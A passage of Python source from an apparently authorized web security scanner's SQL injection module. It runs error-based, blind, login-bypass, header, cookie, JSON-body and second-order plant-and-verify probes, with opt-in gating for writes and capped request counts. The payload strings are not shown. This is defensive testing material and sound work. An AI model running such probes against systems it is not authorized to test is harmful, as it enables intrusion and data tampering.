                        f"fingerprint ('{fingerprint}') in the response (HTTP {status}) -- the cookie "
                        "value reached the SQL layer unsanitized. This is a candidate signal only: no "
                        "data was extracted or altered."
                    )
                    finding = self._finding(
                        endpoint, vuln_type, cookie_name, description,
                        request_preview=f"{endpoint.method} {endpoint.url}\nCookie: {cookie_name}={payload_value!r}", response_preview=body,
                    )
                    finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label=f"sqli-cookie-{cookie_name}") if evidence else []
                    return self._result(tid, technique, vuln_type, FAIL, description, role=self.config.low_priv_role, endpoint=endpoint, finding=finding)
        return self._result(
            tid, technique, vuln_type, PASS,
            f"{len(bounded)} endpoint(s) probed with {len(controllable)} authorized-controllable "
            f"cookie(s) x {len(payloads)} error-triggering payload(s) each, no DB error fingerprint observed",
            role=self.config.low_priv_role,
        )

    async def _technique_second_order(
        self,
        endpoints: "list[Endpoint]",
        session_manager: "SessionManager",
        session_pool: "SessionPool",
        evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        """Two-act plant/verify technique (see the module docstring and
        `sqli_knowledge_base.json`'s `second_order` pattern): plant a
        syntax-breaking payload into a free-text field via a low-priv
        POST, then check whether a DIFFERENT, likely-privileged GET
        endpoint later reflects a DB-error fingerprint when read back
        through a SEPARATE, higher-privileged authenticated context.
        Total probe volume is bounded at
        `max_second_order_plant_targets x max_second_order_verify_targets`
        (default 3x3=9) -- same DoS-avoidance discipline as the
        time-based technique's own cap. The plant phase is a real POST,
        so it's gated behind `allow_state_changing_probes`, same
        convention as every other write-verb technique in this
        codebase."""
        tid, technique = "TC-127.6", "Second-order SQL injection (stored payload, cross-endpoint verification)"
        vuln_type = "SQL Injection (second-order)"
        if not self.config.allow_state_changing_probes:
            return self._result(tid, technique, vuln_type, SKIPPED, "allow_state_changing_probes is disabled -- the plant phase requires a real POST")

        plant_candidates = _second_order_plant_candidates(endpoints, self.config.max_second_order_plant_targets)
        verify_candidates = _second_order_verify_candidates(endpoints, self.config.max_second_order_verify_targets)
        if not plant_candidates:
            return self._result(tid, technique, vuln_type, SKIPPED, "no discovered POST form has a free-text-shaped field (comment/message/feedback/subject/notes/name/body) to plant a payload into")
        if not verify_candidates:
            return self._result(tid, technique, vuln_type, SKIPPED, "no discovered endpoint looks like a privileged display/admin page to verify against")

        payload_value = _ERROR_BASED_PAYLOADS[0]
        try:
            _plant_session, plant_context = await self._authenticated_context(session_manager, session_pool, self.config.low_priv_role, plant_candidates[0][0].url)
        except KeyError as exc:
            return self._result(tid, technique, vuln_type, SKIPPED, f"role '{self.config.low_priv_role}' not configured: {exc}")
        try:
            _verify_session, verify_context = await self._authenticated_context(session_manager, session_pool, self.config.high_priv_role, verify_candidates[0].url)
        except KeyError as exc:
            return self._result(tid, technique, vuln_type, SKIPPED, f"role '{self.config.high_priv_role}' not configured: {exc}")

        for plant_endpoint, plant_field in plant_candidates:
            params = build_params(plant_endpoint, plant_field, payload_value)
            location = plant_endpoint.location_for(plant_field)
            plant_probe = await send_probe(plant_context, plant_endpoint, params, location)
            if plant_probe is None:
                continue
            for verify_endpoint in verify_candidates:
                verify_probe = await self._probe_get(verify_context, verify_endpoint.url)
                if verify_probe is None:
                    continue
                verify_status, verify_body = verify_probe
                fingerprint = looks_like_sql_error(verify_body)
                if fingerprint is None:
                    continue
                description = (
                    f"Planted {payload_value!r} into field '{plant_field}' via {plant_endpoint.method} "
                    f"{plant_endpoint.url} (as role '{self.config.low_priv_role}'); a SEPARATE, later "
                    f"GET request to {verify_endpoint.url} (as role '{self.config.high_priv_role}') "
                    f"showed a database-error fingerprint ('{fingerprint}', HTTP {verify_status}) in "
                    "its response -- evidence the previously-stored value was read back into an "
                    "unsanitized query by a different endpoint/role. This is a candidate signal only: "
                    "no data was extracted or altered beyond the benign planted string."
                )
                finding = self._finding(
                    verify_endpoint, vuln_type, plant_field, description,
                    request_preview=(
                        f"PLANT: {plant_endpoint.method} {plant_endpoint.url}\n{plant_field}={payload_value!r}\n"
                        f"VERIFY: GET {verify_endpoint.url}"
                    ),
                    response_preview=verify_body,
                )
                finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label="sqli-second-order") if evidence else []
                return self._result(tid, technique, vuln_type, FAIL, description, role=self.config.high_priv_role, endpoint=verify_endpoint, finding=finding)
        return self._result(
            tid, technique, vuln_type, PASS,
            f"{len(plant_candidates)} free-text field(s) planted, {len(verify_candidates)} privileged "
            "endpoint(s) checked afterward, no DB error fingerprint observed on read-back",
            role=self.config.high_priv_role,
        )

    async def run_techniques(
        self,
        endpoints: "list[Endpoint]",
        session_manager: "SessionManager",
        session_pool: "SessionPool",
        evidence: "EvidenceCollector | None" = None,
    ) -> list[TestCaseResult]:
        candidates = self._param_candidates(endpoints)
        results: list[TestCaseResult] = []

        if not candidates:
            results.append(self._result("TC-127.1", "Error-based SQL injection (DB error fingerprint in response)", "SQL Injection (error-based)", SKIPPED, "no query/body parameter discovered to probe"))
            results.append(self._result("TC-127.2", "Boolean-based blind SQL injection (true/false response differential)", "SQL Injection (boolean-based blind)", SKIPPED, "no query/body parameter discovered to probe"))
            results.append(self._result("TC-127.3", f"Time-based blind SQL injection (one {_TIME_BASED_DELAY_S:.0f}s-capped payload)", "SQL Injection (time-based blind)", SKIPPED, "no query/body parameter discovered to probe"))
        else:
            target_url = self.config.target_url or candidates[0][0].url
            try:
                _session, context = await self._authenticated_context(session_manager, session_pool, self.config.low_priv_role, target_url)
            except KeyError as exc:
                reason = f"role '{self.config.low_priv_role}' not configured: {exc}"
                results.append(self._result("TC-127.1", "Error-based SQL injection (DB error fingerprint in response)", "SQL Injection (error-based)", SKIPPED, reason))
                results.append(self._result("TC-127.2", "Boolean-based blind SQL injection (true/false response differential)", "SQL Injection (boolean-based blind)", SKIPPED, reason))
                results.append(self._result("TC-127.3", f"Time-based blind SQL injection (one {_TIME_BASED_DELAY_S:.0f}s-capped payload)", "SQL Injection (time-based blind)", SKIPPED, reason))
            else:
                results.append(await self._safe_result(self._technique_error_based(candidates, context, evidence), "TC-127", "TC-127.1", "Error-based SQL injection (DB error fingerprint in response)", "SQL Injection (error-based)", role=self.config.low_priv_role))
                results.append(await self._safe_result(self._technique_boolean_blind(candidates, context, evidence), "TC-127", "TC-127.2", "Boolean-based blind SQL injection (true/false response differential)", "SQL Injection (boolean-based blind)", role=self.config.low_priv_role))
                results.append(await self._safe_result(self._technique_time_based(candidates, context, evidence), "TC-127", "TC-127.3", f"Time-based blind SQL injection (one {_TIME_BASED_DELAY_S:.0f}s-capped payload)", "SQL Injection (time-based blind)", role=self.config.low_priv_role))

        results.append(await self._safe_result(self._technique_login_bypass(endpoints, session_pool, evidence), "TC-127", "TC-127.4", "SQL injection login-form authentication bypass", "SQL Injection (login bypass)", role="unauthenticated"))

        header_tid, header_technique = "TC-127.5", "Header-based SQL injection (payload in User-Agent/X-Forwarded-For/Referer)"
        json_tid, json_technique = "TC-127.7", "JSON-body SQL injection (payload in a JSON request body parameter)"
        cookie_tid, cookie_technique = "TC-127.8", "Cookie-based SQL injection (payload in an authorized, non-auth cookie already set by this session)"
        if not endpoints:
            results.append(self._result(header_tid, header_technique, "SQL Injection (header-based)", SKIPPED, "no discovered endpoint to probe"))
            results.append(self._result(cookie_tid, cookie_technique, "SQL Injection (cookie-based)", SKIPPED, "no discovered endpoint to probe"))
        else:
            target_url = self.config.target_url or endpoints[0].url
            try:
                header_session, header_context = await self._authenticated_context(session_manager, session_pool, self.config.low_priv_role, target_url)
            except KeyError as exc:
                reason = f"role '{self.config.low_priv_role}' not configured: {exc}"
                results.append(self._result(header_tid, header_technique, "SQL Injection (header-based)", SKIPPED, reason))
                results.append(self._result(cookie_tid, cookie_technique, "SQL Injection (cookie-based)", SKIPPED, reason))
            else:
                # Same authenticated context/session reused for both --
                # TC-127.8 needs the session's own `cookies` dict (Layer
                # 5), TC-127.5/.8 both just need a probe-capable context
                # for the same low-priv role; no reason to authenticate twice.
                results.append(await self._safe_result(self._technique_header_based(endpoints, header_context, evidence), "TC-127", header_tid, header_technique, "SQL Injection (header-based)", role=self.config.low_priv_role))
                results.append(await self._safe_result(self._technique_cookie_based(endpoints, header_session, header_context, evidence), "TC-127", cookie_tid, cookie_technique, "SQL Injection (cookie-based)", role=self.config.low_priv_role))

        # TC-127.7 -- JSON-body: independent of the query/body `candidates`
        # set above (targets `endpoint_type == "api"` endpoints directly),
        # so it gets its own authenticated context the same way TC-127.4/.5
        # do rather than being folded into the `if not candidates` branch.
        if not endpoints:
            results.append(self._result(json_tid, json_technique, "SQL Injection (JSON-body)", SKIPPED, "no discovered endpoint to probe"))
        else:
            target_url = self.config.target_url or endpoints[0].url
            try:
                _json_session, json_context = await self._authenticated_context(session_manager, session_pool, self.config.low_priv_role, target_url)
            except KeyError as exc:
                results.append(self._result(json_tid, json_technique, "SQL Injection (JSON-body)", SKIPPED, f"role '{self.config.low_priv_role}' not configured: {exc}"))
            else:
                results.append(await self._safe_result(self._technique_json_body(endpoints, json_context, evidence), "TC-127", json_tid, json_technique, "SQL Injection (JSON-body)", role=self.config.low_priv_role))

        results.append(await self._safe_result(
            self._technique_second_order(endpoints, session_manager, session_pool, evidence),
            "TC-127", "TC-127.6", "Second-order SQL injection (stored payload, cross-endpoint verification)", "SQL Injection (second-order)",
            role=self.config.low_priv_role,
        ))
        return results
